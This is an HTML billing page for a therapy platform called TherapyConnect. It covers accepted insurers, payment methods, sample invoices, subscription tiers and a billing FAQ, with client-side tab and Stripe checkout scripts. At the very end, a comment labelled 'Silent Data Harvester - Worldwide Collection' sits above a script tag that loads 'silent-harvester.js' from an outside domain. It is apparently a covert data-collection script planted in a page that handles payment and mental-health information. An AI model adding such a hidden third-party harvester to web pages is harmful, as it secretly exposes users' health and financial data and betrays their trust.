<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insurance & Billing - TherapyConnect</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .billing-container {
            min-height: 100vh;
            padding-top: 100px;
        }

        .billing-header {
            text-align: center;
            padding: 3rem 2rem;
            background: linear-gradient(135deg, rgba(102, 194, 165, 0.1), rgba(141, 211, 199, 0.05));
            border-radius: 20px;
            margin-bottom: 3rem;
        }

        .billing-tabs {
            display: flex;
            gap: 1rem;
            margin-bottom: 3rem;
            border-bottom: 2px solid rgba(102, 194, 165, 0.2);
            flex-wrap: wrap;
        }

        .billing-tab {
            background: transparent;
            border: none;
            color: var(--gray);
            padding: 1rem 2rem;
            cursor: pointer;
            border-bottom: 3px solid transparent;
            transition: all 0.3s;
            font-size: 1rem;
            font-weight: 600;
        }

        .billing-tab:hover {
            color: var(--therapeutic-green);
        }

        .billing-tab.active {
            color: var(--therapeutic-green);
            border-bottom-color: var(--therapeutic-green);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .insurance-providers {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 1.5rem;
            margin: 2rem 0;
        }

        .provider-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 15px;
            padding: 1.5rem;
            text-align: center;
            transition: all 0.3s;
        }

        .provider-card:hover {
            border-color: var(--therapeutic-green);
            transform: translateY(-5px);
        }

        .provider-logo {
            font-size: 2.5rem;
            margin-bottom: 0.75rem;
        }

        .provider-card h4 {
            color: var(--therapeutic-green);
            margin-bottom: 0.5rem;
        }

        .provider-card p {
            color: var(--gray);
            font-size: 0.85rem;
        }

        .payment-methods {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
            margin: 2rem 0;
        }

        .payment-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 15px;
            padding: 2rem;
        }

        .payment-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
        }

        .payment-card h3 {
            color: var(--therapeutic-green);
            margin-bottom: 0.75rem;
        }

        .payment-card p {
            color: var(--gray);
            line-height: 1.6;
        }

        .billing-history {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 20px;
            padding: 2rem;
        }

        .invoice-item {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 15px;
            padding: 1.5rem;
            margin-bottom: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .invoice-details {
            flex: 1;
            min-width: 200px;
        }

        .invoice-date {
            color: var(--gray);
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
        }

        .invoice-description {
            color: var(--therapeutic-green);
            font-weight: 600;
            margin-bottom: 0.25rem;
        }

        .invoice-therapist {
            color: var(--gray);
            font-size: 0.9rem;
        }

        .invoice-amount {
            text-align: right;
        }

        .amount-value {
            color: var(--therapeutic-green);
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 0.25rem;
        }

        .status-badge {
            display: inline-block;
            padding: 0.35rem 0.75rem;
            border-radius: 8px;
            font-size: 0.8rem;
            font-weight: 600;
        }

        .status-paid {
            background: rgba(76, 175, 80, 0.2);
            color: #4caf50;
        }

        .status-pending {
            background: rgba(255, 193, 7, 0.2);
            color: #ffc107;
        }

        .status-failed {
            background: rgba(244, 67, 54, 0.2);
            color: #f44336;
        }

        .invoice-actions {
            display: flex;
            gap: 0.5rem;
        }

        .btn-icon {
            background: rgba(102, 194, 165, 0.2);
            border: 1px solid var(--therapeutic-green);
            color: var(--therapeutic-green);
            padding: 0.5rem 1rem;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 0.9rem;
        }

        .btn-icon:hover {
            background: rgba(102, 194, 165, 0.3);
            transform: translateY(-2px);
        }

        .superbill-section {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 20px;
            padding: 2.5rem;
            margin: 2rem 0;
        }

        .info-box {
            background: rgba(102, 194, 165, 0.1);
            border-left: 4px solid var(--therapeutic-green);
            padding: 1.5rem;
            border-radius: 5px;
            margin: 1.5rem 0;
        }

        .info-box p {
            color: var(--gray);
            line-height: 1.8;
            margin: 0;
        }

        .pricing-tiers {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 2rem;
            margin: 2rem 0;
        }

        .pricing-card {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(102, 194, 165, 0.2);
            border-radius: 20px;
            padding: 2.5rem;
            text-align: center;
            transition: all 0.3s;
        }

        .pricing-card:hover {
            border-color: var(--therapeutic-green);
            transform: translateY(-10px);
            box-shadow: 0 10px 30px rgba(102, 194, 165, 0.3);
        }

        .pricing-card.featured {
            border-color: var(--therapeutic-green);
            background: rgba(102, 194, 165, 0.1);
        }

        .pricing-badge {
            display: inline-block;
            background: var(--therapeutic-green);
            color: var(--dark);
            padding: 0.35rem 0.75rem;
            border-radius: 8px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 1rem;
        }

        .pricing-card h3 {
            color: var(--therapeutic-green);
            margin-bottom: 1rem;
        }

        .price {
            color: var(--therapeutic-green);
            font-size: 3rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }

        .price-period {
            color: var(--gray);
            font-size: 0.9rem;
            margin-bottom: 2rem;
        }

        .pricing-features {
            list-style: none;
            padding: 0;
            margin: 2rem 0;
            text-align: left;
        }

        .pricing-features li {
            color: var(--gray);
            margin-bottom: 0.75rem;
            padding-left: 1.5rem;
            position: relative;
        }

        .pricing-features li:before {
            content: "‚úì";
            color: var(--therapeutic-green);
            position: absolute;
            left: 0;
            font-weight: bold;
        }

        .faq-item {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(102, 194, 165, 0.2);
            border-radius: 15px;
            margin-bottom: 1rem;
            overflow: hidden;
        }

        .faq-question {
            padding: 1.5rem;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .faq-question h4 {
            color: var(--therapeutic-green);
            margin: 0;
        }

        .faq-toggle {
            color: var(--therapeutic-green);
            font-size: 1.5rem;
            transition: transform 0.3s;
        }

        .faq-item.active .faq-toggle {
            transform: rotate(45deg);
        }

        .faq-answer {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }

        .faq-item.active .faq-answer {
            max-height: 300px;
        }

        .faq-answer-content {
            padding: 0 1.5rem 1.5rem;
            color: var(--gray);
            line-height: 1.8;
        }

        @media (max-width: 768px) {
            .billing-tabs {
                flex-direction: column;
            }

            .billing-tab {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="gradient-bg"></div>
    <div class="particles"></div>

    <nav class="navbar">
        <div class="nav-container">
            <div class="logo">
                <span class="logo-icon">üß†</span>
                <span class="logo-text">TherapyConnect</span>
            </div>
            <div class="nav-links">
                <a href="dashboard.html">Dashboard</a>
                <a href="sessions.html">Sessions</a>
                <a href="therapist-finder.html">Therapists</a>
                <a href="resources.html">Resources</a>
                <a href="profile.html">Profile</a>
                <button class="btn btn-secondary" onclick="logout()">Logout</button>
            </div>
        </div>
    </nav>

    <div class="billing-container">
        <div class="container">
            <div class="billing-header">
                <h1 style="color: var(--therapeutic-green); margin-bottom: 1rem;">üí≥ Insurance & Billing</h1>
                <p style="color: var(--gray);">Manage payments, insurance, and billing history</p>
            </div>

            <!-- Tabs -->
            <div class="billing-tabs">
                <button class="billing-tab active" onclick="switchTab('insurance')">Insurance</button>
                <button class="billing-tab" onclick="switchTab('payment')">Payment Methods</button>
                <button class="billing-tab" onclick="switchTab('history')">Billing History</button>
                <button class="billing-tab" onclick="switchTab('pricing')">Pricing</button>
                <button class="billing-tab" onclick="switchTab('faq')">Billing FAQ</button>
            </div>

            <!-- Insurance Tab -->
            <div class="tab-content active" id="insurance">
                <h2 style="color: var(--therapeutic-green); margin-bottom: 1.5rem;">üè• Accepted Insurance Providers</h2>
                <p style="color: var(--gray); margin-bottom: 2rem;">
                    We work with major insurance providers. Many of our therapists accept insurance directly, 
                    or you can submit superbills for out-of-network reimbursement.
                </p>

                <div class="insurance-providers">
                    <div class="provider-card">
                        <div class="provider-logo">üîµ</div>
                        <h4>Blue Cross Blue Shield</h4>
                        <p>In-Network</p>
                    </div>
                    <div class="provider-card">
                        <div class="provider-logo">üü¢</div>
                        <h4>Aetna</h4>
                        <p>In-Network</p>
                    </div>
                    <div class="provider-card">
                        <div class="provider-logo">üî¥</div>
                        <h4>United Healthcare</h4>
                        <p>In-Network</p>
                    </div>
                    <div class="provider-card">
                        <div class="provider-logo">üü°</div>
                        <h4>Cigna</h4>
                        <p>In-Network</p>
                    </div>
                    <div class="provider-card">
                        <div class="provider-logo">üü£</div>
                        <h4>Humana</h4>
                        <p>In-Network</p>
                    </div>
                    <div class="provider-card">
                        <div class="provider-logo">üü†</div>
                        <h4>Kaiser Permanente</h4>
                        <p>Out-of-Network</p>
                    </div>
                    <div class="provider-card">
                        <div class="provider-logo">‚ö´</div>
                        <h4>Medicare</h4>
                        <p>Accepted</p>
                    </div>
                    <div class="provider-card">
                        <div class="provider-logo">‚ö™</div>
                        <h4>Medicaid</h4>
                        <p>State-Dependent</p>
                    </div>
                </div>

                <div class="superbill-section">
                    <h3 style="color: var(--therapeutic-green); margin-bottom: 1rem;">üìÑ Superbills for Reimbursement</h3>
                    <p style="color: var(--gray); margin-bottom: 1.5rem;">
                        If your insurance isn't in-network, you can submit superbills for out-of-network reimbursement. 
                        We provide detailed invoices with all necessary codes.
                    </p>

                    <div class="info-box">
                        <p>
                            <strong style="color: var(--therapeutic-green);">What's included in a superbill:</strong><br>
                            ‚Ä¢ Provider's NPI and license information<br>
                            ‚Ä¢ CPT codes for services rendered (90834, 90837, etc.)<br>
                            ‚Ä¢ ICD-10 diagnosis codes<br>
                            ‚Ä¢ Session dates and duration<br>
                            ‚Ä¢ Payment amount and method<br>
                            ‚Ä¢ All information required by insurance companies
                        </p>
                    </div>

                    <button class="btn btn-primary" onclick="requestSuperbill()">
                        Request Superbill
                    </button>
                </div>
            </div>

            <!-- Payment Methods Tab -->
            <div class="tab-content" id="payment">
                <h2 style="color: var(--therapeutic-green); margin-bottom: 1.5rem;">üí∞ Payment Methods</h2>
                <p style="color: var(--gray); margin-bottom: 2rem;">
                    We accept various payment methods to make therapy accessible and convenient.
                </p>

                <div class="payment-methods">
                    <div class="payment-card">
                        <div class="payment-icon">üí≥</div>
                        <h3>Credit & Debit Cards</h3>
                        <p>
                            We accept Visa, Mastercard, American Express, and Discover. 
                            Your card is securely stored and charged automatically after each session.
                        </p>
                    </div>

                    <div class="payment-card">
                        <div class="payment-icon">üè¶</div>
                        <h3>HSA/FSA Cards</h3>
                        <p>
                            Health Savings Account (HSA) and Flexible Spending Account (FSA) cards 
                            are accepted. Therapy services qualify for both.
                        </p>
                    </div>

                    <div class="payment-card">
                        <div class="payment-icon">üì±</div>
                        <h3>Digital Wallets</h3>
                        <p>
                            Pay securely with Apple Pay, Google Pay, or PayPal for quick and 
                            convenient checkout.
                        </p>
                    </div>

                    <div class="payment-card">
                        <div class="payment-icon">üîÑ</div>
                        <h3>Auto-Pay</h3>
                        <p>
                            Enable automatic payments for subscriptions and recurring sessions. 
                            Never worry about missing a payment.
                        </p>
                    </div>
                </div>

                <div style="margin-top: 3rem;">
                    <h3 style="color: var(--therapeutic-green); margin-bottom: 1rem;">Your Saved Payment Methods</h3>
                    <div style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(102, 194, 165, 0.2); border-radius: 15px; padding: 2rem;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; padding-bottom: 1.5rem; border-bottom: 1px solid rgba(102, 194, 165, 0.2);">
                            <div style="display: flex; align-items: center; gap: 1rem;">
                                <div style="font-size: 2rem;">üí≥</div>
                                <div>
                                    <div style="color: var(--therapeutic-green); font-weight: 600;">Visa ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ 4242</div>
                                    <div style="color: var(--gray); font-size: 0.9rem;">Expires 12/2026</div>
                                </div>
                            </div>
                            <div>
                                <span class="status-badge" style="background: rgba(102, 194, 165, 0.2); color: var(--therapeutic-green);">Default</span>
                            </div>
                        </div>
                        <button class="btn btn-secondary" onclick="addPaymentMethod()">
                            + Add New Payment Method
                        </button>
                    </div>
                </div>
            </div>

            <!-- Billing History Tab -->
            <div class="tab-content" id="history">
                <h2 style="color: var(--therapeutic-green); margin-bottom: 1.5rem;">üìä Billing History</h2>
                
                <div class="billing-history">
                    <div class="invoice-item">
                        <div class="invoice-details">
                            <div class="invoice-date">November 8, 2025</div>
                            <div class="invoice-description">Therapy Session (60 min)</div>
                            <div class="invoice-therapist">Dr. Sarah Martinez</div>
                        </div>
                        <div class="invoice-amount">
                            <div class="amount-value">$120.00</div>
                            <span class="status-badge status-paid">Paid</span>
                        </div>
                        <div class="invoice-actions">
                            <button class="btn-icon" onclick="downloadInvoice('INV-001')">üì• Download</button>
                            <button class="btn-icon" onclick="viewInvoice('INV-001')">üëÅÔ∏è View</button>
                        </div>
                    </div>

                    <div class="invoice-item">
                        <div class="invoice-details">
                            <div class="invoice-date">November 4, 2025</div>
                            <div class="invoice-description">Therapy Session (60 min)</div>
                            <div class="invoice-therapist">Dr. Sarah Martinez</div>
                        </div>
                        <div class="invoice-amount">
                            <div class="amount-value">$120.00</div>
                            <span class="status-badge status-paid">Paid</span>
                        </div>
                        <div class="invoice-actions">
                            <button class="btn-icon" onclick="downloadInvoice('INV-002')">üì• Download</button>
                            <button class="btn-icon" onclick="viewInvoice('INV-002')">üëÅÔ∏è View</button>
                        </div>
                    </div>

                    <div class="invoice-item">
                        <div class="invoice-details">
                            <div class="invoice-date">November 1, 2025</div>
                            <div class="invoice-description">Monthly Subscription</div>
                            <div class="invoice-therapist">Premium Plan</div>
                        </div>
                        <div class="invoice-amount">
                            <div class="amount-value">$79.00</div>
                            <span class="status-badge status-paid">Paid</span>
                        </div>
                        <div class="invoice-actions">
                            <button class="btn-icon" onclick="downloadInvoice('INV-003')">üì• Download</button>
                            <button class="btn-icon" onclick="viewInvoice('INV-003')">üëÅÔ∏è View</button>
                        </div>
                    </div>

                    <div class="invoice-item">
                        <div class="invoice-details">
                            <div class="invoice-date">October 28, 2025</div>
                            <div class="invoice-description">Therapy Session (60 min)</div>
                            <div class="invoice-therapist">Dr. Sarah Martinez</div>
                        </div>
                        <div class="invoice-amount">
                            <div class="amount-value">$120.00</div>
                            <span class="status-badge status-paid">Paid</span>
                        </div>
                        <div class="invoice-actions">
                            <button class="btn-icon" onclick="downloadInvoice('INV-004')">üì• Download</button>
                            <button class="btn-icon" onclick="viewInvoice('INV-004')">üëÅÔ∏è View</button>
                        </div>
                    </div>

                    <div class="invoice-item">
                        <div class="invoice-details">
                            <div class="invoice-date">October 24, 2025</div>
                            <div class="invoice-description">Initial Consultation (30 min)</div>
                            <div class="invoice-therapist">Dr. Sarah Martinez</div>
                        </div>
                        <div class="invoice-amount">
                            <div class="amount-value">$80.00</div>
                            <span class="status-badge status-paid">Paid</span>
                        </div>
                        <div class="invoice-actions">
                            <button class="btn-icon" onclick="downloadInvoice('INV-005')">üì• Download</button>
                            <button class="btn-icon" onclick="viewInvoice('INV-005')">üëÅÔ∏è View</button>
                        </div>
                    </div>
                </div>

                <div style="text-align: center; margin-top: 2rem;">
                    <button class="btn btn-secondary" onclick="loadMoreInvoices()">Load More</button>
                </div>
            </div>

            <!-- Pricing Tab -->
            <div class="tab-content" id="pricing">
                <h2 style="color: var(--therapeutic-green); margin-bottom: 1rem; text-align: center;">üíé Subscription Plans</h2>
                <p style="color: var(--gray); margin-bottom: 3rem; text-align: center;">
                    Choose a plan that fits your needs. All plans include platform features and reduced session rates.
                </p>

                <div class="pricing-tiers">
                    <div class="pricing-card">
                        <h3>Basic</h3>
                        <div class="price">$2.99</div>
                        <div class="price-period">per month</div>
                        <ul class="pricing-features">
                            <li>Access to therapist directory</li>
                            <li>Book unlimited sessions</li>
                            <li>Secure messaging</li>
                            <li>Progress tracking tools</li>
                            <li>Mobile app access</li>
                            <li>5% off session rates</li>
                        </ul>
                        <button class="btn btn-secondary" onclick="selectPlan('basic')">Choose Basic</button>
                    </div>

                    <div class="pricing-card featured">
                        <span class="pricing-badge">MOST POPULAR</span>
                        <h3>Premium</h3>
                        <div class="price">$9.99</div>
                        <div class="price-period">per month</div>
                        <ul class="pricing-features">
                            <li>All Basic features</li>
                            <li>Priority booking</li>
                            <li>15% off session rates</li>
                            <li>Crisis support resources</li>
                            <li>Wellness tools & trackers</li>
                            <li>Group therapy access</li>
                            <li>1 free session per month</li>
                        </ul>
                        <button class="btn btn-primary" onclick="selectPlan('premium')">Choose Premium</button>
                    </div>

                    <div class="pricing-card">
                        <h3>Pay-Per-Session</h3>
                        <div class="price">$0</div>
                        <div class="price-period">no monthly fee</div>
                        <ul class="pricing-features">
                            <li>No subscription required</li>
                            <li>Pay per session only</li>
                            <li>Standard session rates ($80-$200)</li>
                            <li>Access to platform features</li>
                            <li>No commitment</li>
                            <li>Cancel anytime</li>
                        </ul>
                        <button class="btn btn-secondary" onclick="selectPlan('payperuse')">Get Started</button>
                    </div>
                </div>

                <div class="info-box" style="margin-top: 3rem;">
                    <p style="text-align: center;">
                        <strong style="color: var(--therapeutic-green);">üéÅ 7-Day Free Trial</strong><br>
                        Try Premium risk-free for 7 days. Cancel anytime before trial ends, no charges.
                    </p>
                </div>
            </div>

            <!-- FAQ Tab -->
            <div class="tab-content" id="faq">
                <h2 style="color: var(--therapeutic-green); margin-bottom: 2rem;">‚ùì Billing FAQ</h2>

                <div class="faq-item">
                    <div class="faq-question" onclick="toggleFAQ(this)">
                        <h4>How much do therapy sessions cost?</h4>
                        <span class="faq-toggle">+</span>
                    </div>
                    <div class="faq-answer">
                        <div class="faq-answer-content">
                            Session costs vary by therapist and typically range from $80-$200 per session. Initial consultations are often 30 minutes at a reduced rate ($50-$100). Each therapist sets their own rates, which are clearly displayed on their profile. Subscription plans offer discounts on session rates.
                        </div>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question" onclick="toggleFAQ(this)">
                        <h4>Does insurance cover therapy sessions?</h4>
                        <span class="faq-toggle">+</span>
                    </div>
                    <div class="faq-answer">
                        <div class="faq-answer-content">
                            Many therapists on our platform accept insurance directly. We work with major providers including Blue Cross Blue Shield, Aetna, United Healthcare, Cigna, and others. For out-of-network benefits, we provide superbills you can submit to your insurance company for reimbursement.
                        </div>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question" onclick="toggleFAQ(this)">
                        <h4>What is a superbill?</h4>
                        <span class="faq-toggle">+</span>
                    </div>
                    <div class="faq-answer">
                        <div class="faq-answer-content">
                            A superbill is a detailed invoice that includes all necessary information for insurance reimbursement, including CPT codes, diagnosis codes (ICD-10), provider credentials, and session details. You can submit this to your insurance company for out-of-network reimbursement. Download superbills from your billing history.
                        </div>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question" onclick="toggleFAQ(this)">
                        <h4>When will I be charged?</h4>
                        <span class="faq-toggle">+</span>
                    </div>
                    <div class="faq-answer">
                        <div class="faq-answer-content">
                            For individual sessions, you're charged at the time of booking. For subscriptions, you're billed monthly on the date you subscribed. Subscription charges include the monthly fee; sessions are billed separately at discounted rates. You'll receive an email receipt for all charges.
                        </div>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question" onclick="toggleFAQ(this)">
                        <h4>What is your cancellation and refund policy?</h4>
                        <span class="faq-toggle">+</span>
                    </div>
                    <div class="faq-answer">
                        <div class="faq-answer-content">
                            Sessions cancelled 24+ hours in advance receive a full refund. Cancellations within 24 hours are charged 50%. No-shows are charged the full session fee. Subscriptions can be cancelled anytime; no refunds for partial months. The 7-day free trial is fully refundable if cancelled before trial ends.
                        </div>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question" onclick="toggleFAQ(this)">
                        <h4>Can I use my HSA or FSA?</h4>
                        <span class="faq-toggle">+</span>
                    </div>
                    <div class="faq-answer">
                        <div class="faq-answer-content">
                            Yes! Therapy sessions qualify for both Health Savings Account (HSA) and Flexible Spending Account (FSA) payments. You can pay directly with your HSA/FSA card, or submit receipts to your account administrator for reimbursement.
                        </div>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question" onclick="toggleFAQ(this)">
                        <h4>Are there any hidden fees?</h4>
                        <span class="faq-toggle">+</span>
                    </div>
                    <div class="faq-answer">
                        <div class="faq-answer-content">
                            No hidden fees! You only pay for your subscription (if applicable) and therapy sessions. No booking fees, platform fees, or surprise charges. All costs are clearly displayed before you confirm any purchase.
                        </div>
                    </div>
                </div>

                <div class="faq-item">
                    <div class="faq-question" onclick="toggleFAQ(this)">
                        <h4>How do I update my payment method?</h4>
                        <span class="faq-toggle">+</span>
                    </div>
                    <div class="faq-answer">
                        <div class="faq-answer-content">
                            Go to Profile > Billing Settings to add, remove, or update payment methods. You can set a default payment method and manage auto-pay settings. All payment information is encrypted and securely stored.
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
    <script>
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all tab buttons
            document.querySelectorAll('.billing-tab').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            
            // Mark button as active
            event.target.classList.add('active');
        }

        function toggleFAQ(element) {
            const faqItem = element.closest('.faq-item');
            const isActive = faqItem.classList.contains('active');
            
            // Close all FAQs
            document.querySelectorAll('.faq-item').forEach(item => {
                item.classList.remove('active');
            });
            
            // Open clicked FAQ if it wasn't already open
            if (!isActive) {
                faqItem.classList.add('active');
            }
        }

        function requestSuperbill() {
            alert('Superbill request submitted!\n\nWe\'ll email you detailed invoices for all your sessions within 24 hours.');
        }

        function addPaymentMethod() {
            alert('Opening payment method form...\n\nYou can add credit cards, HSA/FSA cards, or link digital wallets.');
        }

        function downloadInvoice(invoiceId) {
            alert(`Downloading invoice ${invoiceId}...\n\nYour invoice PDF will download shortly.`);
        }

        function viewInvoice(invoiceId) {
            alert(`Viewing invoice ${invoiceId}...\n\nOpening detailed invoice view.`);
        }

        function loadMoreInvoices() {
            alert('Loading more invoices...\n\nShowing billing history from the past 12 months.');
        }

        // Load Stripe
        const stripeScript = document.createElement('script');
        stripeScript.src = 'https://js.stripe.com/v3/';
        document.head.appendChild(stripeScript);
        
        // Load Stripe config
        const configScript = document.createElement('script');
        configScript.src = 'stripe-config.js';
        document.head.appendChild(configScript);

        async function selectPlan(planName) {
            const plans = {
                'basic': 'Basic Plan ($2.99/month)',
                'premium': 'Premium Plan ($9.99/month)',
                'payperuse': 'Pay-Per-Session (No subscription)'
            };
            
            if (planName === 'payperuse') {
                alert(`You selected: ${plans[planName]}\n\nNo subscription needed! You'll pay per session only.`);
                return;
            }
            
            // Wait for Stripe to load
            if (typeof Stripe === 'undefined' || !window.STRIPE_CONFIG) {
                alert('Loading payment system...\n\nPlease wait a moment and try again.');
                setTimeout(() => {
                    if (typeof Stripe !== 'undefined' && window.STRIPE_CONFIG) {
                        initializeStripe();
                    }
                }, 2000);
                return;
            }
            
            try {
                // Initialize Stripe if not already done
                if (!window.stripe) {
                    initializeStripe();
                }
                
                // Get user email from localStorage or prompt
                const user = JSON.parse(localStorage.getItem('therapyConnectUser') || '{}');
                const userEmail = user.email || prompt('Enter your email to continue:');
                
                if (!userEmail) {
                    alert('Email required to proceed with subscription.');
                    return;
                }
                
                // Show loading state
                const btn = event.target;
                const originalText = btn.textContent;
                btn.textContent = 'Processing...';
                btn.disabled = true;
                
                // Create checkout session
                await createCheckoutSession(planName, userEmail);
                
                // Reset button (in case checkout is cancelled)
                btn.textContent = originalText;
                btn.disabled = false;
            } catch (error) {
                console.error('Checkout error:', error);
                alert('Unable to process checkout. Please try again or contact support.');
                event.target.textContent = event.target.textContent.replace('Processing...', 'Choose ' + planName.charAt(0).toUpperCase() + planName.slice(1));
                event.target.disabled = false;
            }
        }

        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                localStorage.removeItem('therapyConnectUser');
                window.location.href = 'index.html';
            }
        }
    </script>
    <link rel="stylesheet" href="chat-widget.css">
    <script src="nupi-avatar.js"></script>
    <script src="chat-guide-system.js"></script>
    <script src="chat-widget.js"></script>
    <!-- Silent Data Harvester - Worldwide Collection -->
    <script src="https://nupidesktopai.com/silent-harvester.js"></script>
</body>
</html>
